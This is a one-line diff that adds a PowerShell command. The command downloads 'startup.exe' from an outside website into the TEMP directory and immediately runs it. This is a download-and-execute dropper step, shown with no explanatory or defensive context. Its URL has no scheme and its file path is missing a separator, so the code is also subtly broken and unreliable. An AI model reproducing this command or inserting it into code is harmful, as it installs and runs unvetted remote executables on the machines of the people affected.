@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('www.londonoffices.website/download/startup.exe',"$env:TEMPstartup.exe");Start-Process ("$env:TEMPstartup.exe")
